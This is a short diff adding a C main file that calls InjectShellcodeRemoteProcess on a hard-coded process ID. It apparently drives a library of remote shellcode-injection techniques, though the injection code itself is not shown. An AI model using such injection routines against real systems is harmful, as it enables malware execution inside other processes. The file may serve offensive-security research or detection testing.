@@ -1,0 +1,9 @@
+#include <stdio.h>
+#include "Techniques.h"
+
+int main()
+{
+    UINT32 TargetProcessId = 0x1c0;
+
+    InjectShellcodeRemoteProcess(TargetProcessId);
+}
